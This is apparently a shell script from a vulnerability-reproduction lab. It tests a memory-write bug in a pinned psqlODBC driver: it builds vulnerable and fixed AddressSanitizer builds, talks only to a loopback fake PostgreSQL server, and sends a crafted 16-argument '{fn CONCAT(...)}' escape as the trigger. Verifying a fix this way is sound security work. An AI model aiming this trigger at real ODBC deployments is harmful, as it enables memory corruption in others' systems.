#!/bin/sh
# W146: reach the pinned psqlODBC parser through unixODBC's public API.
# Requires replay.sh to have built the ASan vulnerable/fixed trees first.
# The only network peer is fakepg.py on 127.0.0.1; no external probe.
set -eu
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
LAB=$(CDPATH= cd -- "$HERE/.." && pwd)
B="$LAB/src/repo/build"
PORT=${LIVE_PORT:-59432}
E="$B/evidence"
mkdir -p "$E"

gcc -g -O0 -fsanitize=address "$HERE/odbc-harness.c" -o "$B/w146-live-harness" -lodbc

mkcfg() { # dir driver-so
  cfgdir=$1; driver=$2
  mkdir -p "$cfgdir"
  cat >"$cfgdir/odbc.ini" <<EOF
[pg2shell]
Description = W146 loopback-only lab DSN
Driver = psqlodbcw-lab
Server = 127.0.0.1
Servername = 127.0.0.1
Port = $PORT
Database = lab
UID = lab
PWD = lab
EOF
  cat >"$cfgdir/odbcinst.ini" <<EOF
[psqlodbcw-lab]
Description = pinned psqlODBC W146
Driver = $driver
EOF
}

mkcfg "$B/w146-live-vuln" "$B/asan-vuln/.libs/psqlodbcw.so"
mkcfg "$B/w146-live-fixed" "$B/asan-fixed/.libs/psqlodbcw.so"

python3 "$HERE/fakepg.py" "$PORT" >"$E/w146-live-server.log" 2>&1 &
server=$!
trap 'kill "$server" 2>/dev/null || true' EXIT
i=0
while ! grep -q LISTEN "$E/w146-live-server.log" 2>/dev/null; do
  i=$((i + 1))
  [ "$i" -lt 50 ] || { echo "fake server did not start" >&2; exit 1; }
  sleep 0.1
done

args16=$(printf '1,%.0s' $(seq 1 16))
fn16="{fn CONCAT(${args16%,})}"
run() { # label cfgdir sql
  label=$1; cfgdir=$2; sql=$3
  out="$E/w146-live-$label.out"
  ODBCSYSINI="$cfgdir" ODBCINI="$cfgdir/odbc.ini" \
    ASAN_OPTIONS=detect_leaks=0 timeout 20 "$B/w146-live-harness" "$sql" exec \
    >"$out" 2>&1 || true
  printf '%-20s %s\n' "$label" \
    "$(grep -m1 -E 'WRITE of size|ERROR: AddressSanitizer|EXECDIRECT rc' "$out" | cut -c1-110)"
  grep -m1 -E 'in processParameters|in SQLExecDirect|in PGAPI_ExecDirect' "$out" || true
}

run vuln-fn16 "$B/w146-live-vuln" "$fn16"
run fixed-fn16 "$B/w146-live-fixed" "$fn16"
run vuln-safe "$B/w146-live-vuln" '{fn CONCAT(1,2)}'
